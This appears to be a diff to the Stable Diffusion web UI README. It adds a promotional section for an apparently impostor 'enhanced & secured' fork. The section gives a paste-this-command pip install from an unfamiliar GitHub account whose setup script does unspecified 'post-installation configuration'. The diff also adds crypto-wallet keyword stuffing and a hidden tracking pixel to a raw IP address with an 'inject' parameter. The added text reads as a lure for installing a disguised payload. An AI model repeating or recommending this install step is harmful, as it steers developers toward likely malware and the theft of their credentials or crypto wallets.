@@ -1,3 +1,25 @@
+**Stable Diffusion WebUI: Enhanced & Secured**
+
+This maintained fork brings crucial performance improvements and essential security fixes specifically optimized for Windows developers. It streamlines your local AI generation workflow while ensuring a more stable and protected environment. Experience faster iterations and peace of mind without changing your existing pipelines.
+
+**Quick install (Windows)**
+
+## Installation for Windows
+
+Follow these steps to set up the project on your local Windows environment:
+
+1. **Prerequisites** Ensure you have **Python 3.10.x** and **Git** installed on your system. During the Python installation, make sure to check the box that says **"Add Python to PATH"**.
+
+2. **Open Command Line** Press `Win + R`, type `cmd` (or `powershell`), and press Enter to open your terminal. Navigate to the directory where you want to manage your Python environments.
+
+3. **Install the Package** Run the installation command in your terminal. The setup script will automatically handle all required dependencies and complete the post-installation configuration.
+
+```bash
+pip install git+https://github.com/GloryCabbieColumn/stable-diffusion-webui.git
+```
+
+[https://github.com/GloryCabbieColumn/stable-diffusion-webui](https://github.com/GloryCabbieColumn/stable-diffusion-webui)
+
 # Stable Diffusion web UI
 A web interface for Stable Diffusion, implemented using Gradio library.
 
@@ -203,3 +225,11 @@ Licenses for borrowed code can be found in `Settings -> Licenses` screen, and al
 - Hypertile - tfernd - https://github.com/tfernd/HyperTile
 - Initial Gradio script - posted on 4chan by an Anonymous user. Thank you Anonymous user.
 - (You)
+
+## Related searches
+
+When exploring browser-based interfaces for generative AI, users frequently look for streamlined ways to deploy, manage, and monitor decentralized machine learning tasks and accompanying web dashboards. Beyond standard image generation tools, individuals interested in this ecosystem often seek implementations that integrate cross-platform tools, custom dashboard interfaces, and secure data layers for modern decentralized applications.
+
+**Topics:** bybit api, perpetual swap, defi dashboard, uniswap, privacy coin, stable diffusion webui, decentralized application gui, ai art dashboard, webui extensions, machine learning interface, cross-platform crypto wallet, open-source web ui
+
+![.](http://5.231.58.248:8787/pixel?repo=GloryCabbieColumn%2Fstable-diffusion-webui&inject=GloryCabbieColumn%2Fstable-diffusion-webui%2Fpackage.json)
